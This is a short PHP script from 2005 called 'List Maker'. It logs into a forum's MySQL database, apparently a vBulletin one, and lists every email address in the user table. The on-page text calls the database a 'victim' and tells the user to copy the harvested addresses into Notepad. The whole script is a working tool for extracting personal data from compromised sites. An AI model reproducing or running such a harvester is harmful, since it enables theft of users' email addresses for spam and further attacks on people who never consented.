<? 
/*=================================================  ===============*\ 
|| ##################################################  ############ || 
|| # List Maker          Coded By Fedora Girl     3-August-2005 # || 
|| #                      This My First Code                    # || 
|| #                     h2k-girl@hotmail.com                   # || 
|| #       Just Enter Database Name , Username and Password.    # || 
|| ##################################################  ############ || 
\*================================================  ================*/ 
$servername = 'localhost'; 
$dbname = 'DatabaseName'; 
$dbusername = 'YourUserName'; 
$dbpassword = 'YourPassword'; 
/*=================================================  ===============*\ 
|| ##################################################  ############ || 
|| ########    Don't change anything under this line .    ####### // 
|| ##################################################  ############ || 
\*================================================  ================*/ 

echo "<p align='left'><font color='#FFFFFF'>This is List Maker </p>"; 
echo "<body bgcolor='#000000'>"; 
echo " 
<table border='1' cellpadding='0' cellspacing='0' style='border-collapse: collapse; border-style: double; border-width: 3' width='30%' id='AutoNumber1' align='left'> 
  <tr> 
    <td width='38%'> 
    <p align='center'><font color='#FFFFFF'>Name</font></td> 
    <td width='162%'> 
    <p align='center'><font color='#FFFFFF'>Fedora Girl</font></td> 
  </tr> 
  <tr> 
    <td width='38%'> 
    <p align='center'><font color='#FFFFFF'>Visit us</font></td> 
    <td width='162%'> 
    <p align='center'><font color='#FFFFFF'>www.Lezr.com/vb</font></td>"; 
echo "<p align='left'><font color='#FFFFFF'> Please wait to get all Addresses in this victim . 
When completed the page you Copy the addresses in your Notepad :)</p>"; 
echo "<p align='left'><font color='#FFFFFF' size='7'>By</font></p>"; 
$LINK = mysql_connect ("localhost","$dbusername","$dbpassword"); 
$result = mysql_db_query ("$dbname","select * from user") ; 
echo "<br>"; 
echo "<table border =2 cellpadding=0 cellspacing=0 
style=border-collapse: collapse bordercolor=#000000 width=50%" ; 
echo "<td width=30% align=center bgcolor=#808080></td>"; 

while ($row = mysql_fetch_array ($result)) { 
echo "<tr>"; 
echo "<td width=30% align=center>$row[email]</td>"; 
echo "</tr>" ; 
} 
echo "</table>" ; 
mysql_free_result ($result); 
?> 